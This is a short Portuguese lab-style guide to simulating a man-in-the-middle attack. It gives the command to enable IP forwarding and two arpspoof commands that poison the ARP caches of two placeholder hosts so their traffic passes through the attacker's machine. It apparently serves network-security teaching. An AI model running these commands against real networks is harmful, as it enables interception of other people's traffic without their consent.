# Simulação de Ataque Man-in-the-Middle (MITM)

## 1. Habilitar o Encaminhamento de Pacotes (IP Forwarding)

Este comando ativa o encaminhamento de pacotes IPv4 no sistema, permitindo que a máquina atacante atue como um roteador e retransmita o tráfego entre as duas vítimas.

```
echo 1 > /proc/sys/net/ipv4/ip_forward
````

-----

## 2\. Iniciar o Ataque de ARP Spoofing (PC1 -\> PC2)

Este comando envenena o cache ARP do PC1, fazendo-o acreditar que a máquina atacante é o PC2. O tráfego destinado ao PC2 será, então, redirecionado para o atacante.

```
arpspoof -i eth0 -t [IP_DO_PC1] -r [IP_DO_PC2]
```

-----

## 3\. Iniciar o Ataque de ARP Spoofing (PC2 -\> PC1)

Este comando envenena o cache ARP do PC2, fazendo-o acreditar que a máquina atacante é o PC1. O tráfego destinado ao PC1 será, então, redirecionado para o atacante, completando a inserção no meio da comunicação.

```
arpspoof -i eth0 -t [IP_DO_PC2] -r [IP_DO_PC1]
```
